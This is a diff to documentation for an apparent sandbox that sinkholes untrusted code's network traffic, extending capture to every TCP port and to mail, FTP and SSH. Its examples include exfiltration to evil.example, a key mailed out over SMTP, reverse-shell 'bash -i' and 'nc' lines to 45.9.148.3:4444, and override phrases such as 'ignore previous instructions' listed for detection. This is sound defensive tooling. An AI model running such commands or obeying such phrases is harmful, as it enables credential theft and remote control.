@@ -111,8 +111,8 @@ and runs nothing.
 | processes | still running as the sandbox's user |
 | listening | sockets it opened |
 | dns | every name the code looked up, with its type and count — `github.com`, `pastebin.com`, `x7f3.evil.example`. A name sent to another resolver directly (`dig @8.8.8.8`) shows only as a connection |
-| requests | what it sent the sinkhole: method, URL, size, and whether this run's decoy token was in it (as is, URL- or base64-encoded, gzipped), or only as its own service's credential (`token_to_its_service`: `Authorization` to GitHub, npm's registry, PyPI, AWS; the OIDC token's URL) — `POST https://evil.example/collect` carrying the fake AWS key. `tls_refused`: HTTPS clients that refused the sinkhole's certificate (a list of authorities of their own): the name only |
-| connections | what it tried that the network refused (the host's view); the report names the program that tried each (audit's `connect`, inside) |
+| requests | what it sent the sinkhole: method, URL, size, and whether this run's decoy token was in it (as is, URL- or base64-encoded, gzipped), or only as its own service's credential (`token_to_its_service`: `Authorization` to GitHub, npm's registry, PyPI, AWS; the OIDC token's URL) — `POST https://evil.example/collect` carrying the fake AWS key. `tls_refused`: HTTPS clients that refused the sinkhole's certificate (a list of authorities of their own): the name only. `tcp`: what it said on any other port, or in TLS that was not HTTPS: the protocol, the size, its first bytes and whether the token was in it — a mail to `smtp.gmail.com:587` carrying the fake AWS key, a reverse shell's `bash -i` to `45.9.148.3:4444` |
+| connections | what it tried that the network refused (the host's view: UDP, IPv6); the report names the program that tried each (audit's `connect`, inside) |
 | addresses_an_agent | text in the input or the output that speaks to an AI agent: "ignore previous instructions", "note to the AI:", chat-template tokens (a phrase is `warn`: skills, prompts and their tests are full of them); Unicode that hides text — tag characters, a run of zero-width ones, bidirectional controls in code or a file's name (not one zero-width joiner, which emoji and names have, nor a right-to-left override in pip's `AUTHORS.txt`) |
 
 ### Reading it
@@ -347,7 +347,8 @@ the VM, by the image's `mh-sandbox-net`, and written down:
   list: `.example`, `.local`, `wpad`) is `NXDOMAIN`, with the root's SOA.
   A resolver of the code's own (`dig @8.8.8.8`, UDP or TCP) is answered by
   this one, as from the address it asked.
-- **The sinkhole**, on ports 80 and 443 of those addresses, answers as a
+- **The sinkhole**, on every TCP port of those addresses, tells what a
+  connection speaks from its first bytes. HTTP, on any port, it answers as a
   web server would — `Date`, `Server`, a `Content-Type` — and writes down
   the method, the URL, the size and whether this run's decoy token is in
   it. What it answers, with nothing ever fetched from outside:
@@ -373,14 +374,24 @@ the VM, by the image's `mh-sandbox-net`, and written down:
   each certificate. Nothing in it is dated at the run. Node and pip are
   pointed at the system's list. A client with a list of its own (Python's
   `certifi`, a pinned key) refuses it, and only the name it asked for shows.
+- **Any other protocol**, on any port: TLS gets the same certificate, and
+  what is inside is told the same way (HTTP in it is HTTPS). SMTP (25,
+  587, 2525; 465 in TLS), FTP (21), POP3 (110; 995), IMAP (143; 993) and
+  SSH (22) are greeted as their servers greet, and taken as far as a
+  client needs to get to what it sends: SMTP's `STARTTLS`, `AUTH` and the
+  message, FTP's login and `PASV` (the data connection is one more
+  connection to the sinkhole), IMAP's `APPEND`, POP3's login. SSH stops
+  after the greeting. Anything else is read until the client stops,
+  unanswered (a reverse shell's beacon, a miner's login). Each connection
+  is written down: the port, the protocol, the size, its first bytes, and
+  whether the token was in it.
 - **A bare address** — `curl https://83.142.209.194/x`, the cloud's
-  metadata at `169.254.169.254` — asks no name: its ports 80 and 443 go to
-  the sinkhole too (the image's `iptables`, legacy), which writes the
-  request down under that address. IPv4 only; other ports are refused by
-  the host, as before.
-- **Any other port** of a sinkhole address refuses the connection; audit
-  says which program tried it, and the report names it by the name it
-  looked up (`evil.example:4444`).
+  metadata at `169.254.169.254`, `nc 45.9.148.3 4444` — asks no name: its
+  TCP, every port, goes to the sinkhole too (the image's `iptables`,
+  legacy: a `REDIRECT`, and the address it meant read back), written down
+  under that address. IPv4 only; UDP other than DNS, and IPv6, are
+  refused by the host, as before. An image without `iptables` serves
+  ports 80 and 443 of the names' addresses only; the rest refuse.
 
 It runs as a user of its own (`mhsink`), neither root nor the code's: it
 parses what the code sends, and a mistake there must not give the code
@@ -462,6 +473,8 @@ by default: an answer makes code go further, and only where you asked.
   "requests":    [{"count": 1, "scheme": "https", "method": "POST", "url": "https://evil.example/collect",
                    "port": 443, "bytes": 2048, "carries_token": true, "first_ms": 2330, "last_ms": 2330}],
   "tls_refused": [{"count": 1, "name": "pypi.org", "first_ms": 900, "last_ms": 900}],
+  "tcp":         [{"count": 1, "port": 587, "proto": "smtp", "host": "smtp.gmail.com", "bytes": 2300,
+                   "carries_token": true, "first": "EHLO x\\x0d\\x0a…", "first_ms": 2500, "last_ms": 2500}],
   "addresses_an_agent": [{"where": "input", "file": "README.md", "line": 12, "text": "ignore previous instructions", "severity": "warn"}],  // where: input, output, created (a file's name)
   "output": "…",                   // the command's, last 8 KiB
   "warnings": ["audit lost 3 events: vm_probes may be incomplete"],
@@ -488,7 +501,7 @@ startup file, audit's health), a connection refused before this run too
 variable the code can set: untrusted, like the text beside it. A command's
 `pid` and `ppid` are its first run's: the tree of who started what.
 
-Untrusted (the code's choice): `decoys[].by`, `changed.*`, `dns[].name`, `requests[].method` and `.url`, `tls_refused[].name`, `vm_probes[].path` and `.by`,
+Untrusted (the code's choice): `decoys[].by`, `changed.*`, `dns[].name`, `requests[].method` and `.url`, `tls_refused[].name`, `tcp[].host` and `.first`, `vm_probes[].path` and `.by`,
 `privesc[].path` and `.by`, `commands[].args`, `alerts[].what` and `.by`,
 `processes[].args`, `addresses_an_agent[].file` and `.text`, `output`,
 `accepted[].what` and `.by`.
